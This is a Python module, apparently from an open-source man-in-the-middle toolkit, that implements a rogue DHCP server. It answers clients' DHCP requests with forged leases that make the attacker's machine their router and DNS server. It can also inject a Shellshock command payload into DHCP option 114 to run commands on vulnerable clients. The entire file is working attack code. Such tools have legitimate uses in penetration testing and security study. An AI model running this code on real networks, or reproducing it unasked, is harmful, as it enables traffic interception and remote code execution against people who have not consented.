# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import threading
import binascii
import random

from netaddr import IPAddress, IPNetwork, IPRange, AddrFormatError
from core.logger import logger
from scapy.all import *

formatter = logging.Formatter("%(asctime)s [DHCPpoisoner] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
log = logger().setup_logger("DHCPpoisoner", formatter)

class DHCPpoisoner():

    def __init__(self, options, dhcpcfg):
        self.interface   = options.interface
        self.ip_address  = options.ip
        self.mac_address = options.mac
        self.shellshock  = options.shellshock
        self.debug       = False
        self.dhcpcfg     = dhcpcfg
        self.dhcp_dic    = {}

        log.debug("interface  => {}".format(self.interface))
        log.debug("ip         => {}".format(self.ip_address))
        log.debug("mac        => {}".format(self.mac_address))
        log.debug("shellshock => {}".format(self.shellshock))
        log.debug("dhcpcfg    => {}".format(self.dhcpcfg))

    def start(self):
        self.s2 = conf.L2socket(iface=self.interface)

        t = threading.Thread(name="DHCPpoisoner", target=self.dhcp_sniff)
        t.setDaemon(True)
        t.start()

    def stop(self):
        self.s2.close()

    def dhcp_sniff(self):
        try:
            sniff(filter="udp and (port 67 or 68)", prn=self.dhcp_callback, iface=self.interface)
        except Exception as e:
            if "Interrupted system call" not in e:
               log.error("Exception occurred while poisoning: {}".format(e))

    def dhcp_rand_ip(self):
        pool = self.dhcpcfg['ip_pool']
        try:
            if '/' in pool:
                ips = list(IPNetwork(pool))
                return str(random.choice(ips))

            elif '-' in pool:
                start_addr = IPAddress(pool.split('-')[0])
                try:
                    end_addr = IPAddress(pool.split('-')[1])
                    ips = list(IPRange(start_addr, end_addr))
                except AddrFormatError:
                    end_addr = list(start_addr.words)
                    end_addr[-1] = pool.split('-')[1]

                    end_addr = IPAddress('.'.join(map(str, end_addr)))
                    ips = list(IPRange(start_addr, end_addr))

                return str(random.choice(ips))

            log.error('Specified invalid CIDR/Network range in DHCP pool option')
        except AddrFormatError:
            log.error('Specified invalid CIDR/Network range in DHCP pool option')

    def dhcp_callback(self, resp):
        if resp.haslayer(DHCP):
            log.debug('Saw a DHCP packet')
            xid = resp[BOOTP].xid
            mac_addr = resp[Ether].src
            raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))

            if xid in self.dhcp_dic.keys():
                client_ip = self.dhcp_dic[xid]
            else:
                client_ip = self.dhcp_rand_ip()
                self.dhcp_dic[xid] = client_ip

            if resp[DHCP].options[0][1] == 1:
                log.info("Got DHCP DISCOVER from: " + mac_addr + " xid: " + hex(xid))
                log.info("Sending DHCP OFFER")

                packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
                IP(src=self.ip_address, dst='255.255.255.255') /
                UDP(sport=67, dport=68) /
                BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
                DHCP(options=[("message-type", "offer"),
                    ('server_id', self.ip_address),
                    ('subnet_mask', self.dhcpcfg['subnet']),
                    ('router', self.ip_address),
                    ('name_server', self.ip_address),
                    ('dns_server', self.ip_address),
                    ('lease_time', 172800),
                    ('renewal_time', 86400),
                    ('rebinding_time', 138240),
                    "end"]))

                self.s2.send(packet)

            if resp[DHCP].options[0][1] == 3:
                log.info("Got DHCP REQUEST from: " + mac_addr + " xid: " + hex(xid))

                packet = (Ether(src=self.mac_address, dst='ff:ff:ff:ff:ff:ff') /
                IP(src=self.ip_address, dst='255.255.255.255') /
                UDP(sport=67, dport=68) /
                BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=client_ip, siaddr=self.ip_address, xid=xid) /
                DHCP(options=[("message-type", "ack"),
                    ('server_id', self.ip_address),
                    ('subnet_mask', self.dhcpcfg['subnet']),
                    ('router', self.ip_address),
                    ('name_server', self.ip_address),
                    ('dns_server', self.ip_address),
                    ('lease_time', 172800),
                    ('renewal_time', 86400),
                    ('rebinding_time', 138240)]))

                if self.shellshock:
                    log.info("Sending DHCP ACK with shellshock payload")
                    packet[DHCP].options.append(tuple((114, "() { ignored;}; " + self.shellshock)))
                    packet[DHCP].options.append("end")
                else:
                    log.info("Sending DHCP ACK")
                    packet[DHCP].options.append("end")

                self.s2.send(packet)
